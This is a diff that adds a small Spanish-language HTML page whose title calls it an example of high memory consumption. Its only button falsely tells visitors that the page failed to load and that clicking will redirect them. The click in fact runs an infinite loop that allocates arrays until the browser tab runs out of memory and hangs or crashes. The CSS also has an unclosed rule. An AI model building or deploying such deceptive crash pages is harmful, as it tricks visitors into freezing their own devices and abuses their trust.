@@ -1,0 +1,38 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <title>Ejemplo de alto consumo de memoria</title>
+    <style>
+        /* Estilos personalizados para el botón */
+        .my-button {
+            background-color: #D0DF61;
+            border: none;
+            color: black;
+            padding: 15px 32px;
+            text-align: center;
+            text-decoration: none;
+            display: inline-block;
+            font-size: 16px;
+            margin: 10px;
+            cursor: pointer;
+            border-radius: 8px;
+            font-family: Lemon Days, sans-serif;
+        }
+
+/* Estilos personalizados para el fondo degradado */
+        body {
+            background: linear-gradient(to bottom, #3a6dd7, #FFFFFF);
+    </style>
+    <script>
+        function consumirMemoria() {
+            let array = [];
+            while (true) {
+                array.push(new Array(1000000));
+            }
+        }
+    </script>
+</head>
+<body>
+    <button class="my-button" onclick="consumirMemoria()">Hubo un error al abrir la pagina, dale click a este boton para que te redirrecione a otra pagina</button>
+</body>
+</html>
